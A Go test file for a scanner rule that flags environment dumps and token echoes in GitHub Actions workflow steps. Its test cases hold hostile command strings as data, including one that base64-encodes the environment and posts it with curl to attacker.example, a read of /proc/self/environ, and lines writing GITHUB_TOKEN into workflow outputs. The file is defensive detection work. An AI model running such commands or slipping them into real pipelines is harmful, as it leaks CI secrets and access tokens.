package scanner

import (
	"strings"
	"testing"
)

// --- CICD-SEC-6: env / token exfiltration primitives ------------------------

func TestCheckEnvExfiltration(t *testing.T) {
	cases := []struct {
		name string
		run  string
		// want is the number of findings; wantTitle is a substring of the
		// first finding's title identifying which half of the rule fired.
		want      int
		wantTitle string
	}{
		// --- full-environment enumeration --------------------------------
		{
			name:      "bare printenv dumps the environment",
			run:       "printenv",
			want:      1,
			wantTitle: "environment",
		},
		{
			name:      "bare env dumps the environment",
			run:       "env",
			want:      1,
			wantTitle: "environment",
		},
		{
			name:      "env piped to another command dumps the environment",
			run:       "env | sort",
			want:      1,
			wantTitle: "environment",
		},
		{
			name:      "set piped dumps the shell state",
			run:       "set | grep -i token",
			want:      1,
			wantTitle: "environment",
		},
		{
			name:      "export -p dumps the environment",
			run:       "export -p",
			want:      1,
			wantTitle: "environment",
		},
		{
			name:      "reading /proc/self/environ dumps the environment",
			run:       "cat /proc/self/environ",
			want:      1,
			wantTitle: "environment",
		},
		{
			// The encoded variant is the same primitive at the head of a
			// pipe — it needs no separate obfuscation matcher.
			name:      "env piped through base64 dumps the environment",
			run:       "env | base64 -w0 | curl -X POST -d @- https://attacker.example",
			want:      1,
			wantTitle: "environment",
		},
		{
			name:      "printenv redirected to a file dumps the environment",
			run:       "printenv > /tmp/e",
			want:      1,
			wantTitle: "environment",
		},

		// --- must stay quiet ---------------------------------------------
		{
			name: "env used as a command prefix is not enumeration",
			run:  "env FOO=bar make build",
			want: 0,
		},
		{
			name: "printenv of a single variable is not enumeration",
			run:  "printenv HOME",
			want: 0,
		},
		{
			name: "set -euo pipefail is shell hardening, not enumeration",
			run:  "set -euo pipefail\nmake build",
			want: 0,
		},
		{
			name: "a full-line comment mentioning env does not fire",
			run:  "# env\nmake build",
			want: 0,
		},
		{
			name: "environment-shaped words are not the env command",
			run:  "./scripts/envcheck.sh && npm run env:sync",
			want: 0,
		},

		// --- token echoes -------------------------------------------------
		{
			name:      "echoing GITHUB_TOKEN from the shell environment",
			run:       "echo $GITHUB_TOKEN",
			want:      1,
			wantTitle: "token",
		},
		{
			name:      "echoing a braced GITHUB_TOKEN",
			run:       `echo "${GITHUB_TOKEN}"`,
			want:      1,
			wantTitle: "token",
		},
		{
			name:      "echoing ACTIONS_RUNTIME_TOKEN",
			run:       "printf '%s' $ACTIONS_RUNTIME_TOKEN",
			want:      1,
			wantTitle: "token",
		},
		{
			name:      "base64-encoding a token is still an echo",
			run:       "echo $GITHUB_TOKEN | base64",
			want:      1,
			wantTitle: "token",
		},
		{
			name:      "writing a token into GITHUB_OUTPUT",
			run:       `echo "tok=$GITHUB_TOKEN" >> $GITHUB_OUTPUT`,
			want:      1,
			wantTitle: "token",
		},
		{
			name:      "writing github.token into GITHUB_ENV",
			run:       "echo \"T=${{ github.token }}\" >> $GITHUB_ENV",
			want:      1,
			wantTitle: "token",
		},
		{
			name: "using a token in an Authorization header is not an echo",
			run:  `curl -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL"`,
			want: 0,
		},
		{
			name: "passing a token to gh via env is not an echo",
			run:  "gh pr list",
			want: 0,
		},
	}

	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			wf, jobs := parseTestWorkflow(t, workflowWithRun(tc.run))
			got := CheckEnvExfiltration("test.yml", wf, jobs)
			if len(got) != tc.want {
				t.Fatalf("got %d findings, want %d (findings=%+v)", len(got), tc.want, got)
			}
			if tc.want == 0 {
				return
			}
			f := got[0]
			if f.RuleID != RuleEnvExfil {
				t.Errorf("got rule %q, want %q", f.RuleID, RuleEnvExfil)
			}
			if f.Category != "CICD-SEC-6" {
				t.Errorf("got category %q, want CICD-SEC-6", f.Category)
			}
			if f.Severity != SeverityHigh {
				t.Errorf("got severity %q, want HIGH", f.Severity)
			}
			if !strings.Contains(strings.ToLower(f.Title), tc.wantTitle) {
				t.Errorf("title %q does not mention %q", f.Title, tc.wantTitle)
			}
			if f.Line == 0 {
				t.Error("finding has no line")
			}
		})
	}
}

// workflowWithRun wraps a run script in the smallest workflow that parses.
// The script is indented as a block scalar so multi-line cases keep their
// newlines.
func workflowWithRun(run string) string {
	var b strings.Builder
	b.WriteString("on: push\njobs:\n  build:\n    runs-on: ubuntu-latest\n    steps:\n      - run: |\n")
	for _, line := range strings.Split(run, "\n") {
		b.WriteString("          " + line + "\n")
	}
	return b.String()
}

// One step doing both things is two distinct problems, and both are worth
// naming: the dump and the token echo have different blast radii.
func TestCheckEnvExfiltrationReportsBothPrimitives(t *testing.T) {
	wf, jobs := parseTestWorkflow(t, workflowWithRun("printenv\necho $GITHUB_TOKEN"))
	got := CheckEnvExfiltration("test.yml", wf, jobs)
	if len(got) != 2 {
		t.Fatalf("got %d findings, want 2: %+v", len(got), got)
	}
}

// The rule must name the step and job so a reviewer can find it in a large
// workflow, and must not offer an auto-fix — there is no safe mechanical
// rewrite of an exfiltration primitive.
func TestCheckEnvExfiltrationFindingShape(t *testing.T) {
	const y = `
on: pull_request_target
jobs:
  leak:
    runs-on: ubuntu-latest
    steps:
      - name: dump
        run: printenv
`
	wf, jobs := parseTestWorkflow(t, y)
	got := CheckEnvExfiltration("test.yml", wf, jobs)
	if len(got) != 1 {
		t.Fatalf("got %d findings, want 1", len(got))
	}
	if !strings.Contains(got[0].Description, "dump") || !strings.Contains(got[0].Description, "leak") {
		t.Errorf("description should name the step and job: %s", got[0].Description)
	}
	// No auto-fix: there is no safe mechanical rewrite of an exfiltration
	// primitive, so the fixer must leave the file untouched.
	out, n, err := FixBytes([]byte(y), got)
	if err != nil {
		t.Fatalf("FixBytes: %v", err)
	}
	if out != nil || n != 0 {
		t.Errorf("fixer rewrote the file (%d fixes); this rule is flag-only:\n%s", n, out)
	}
}
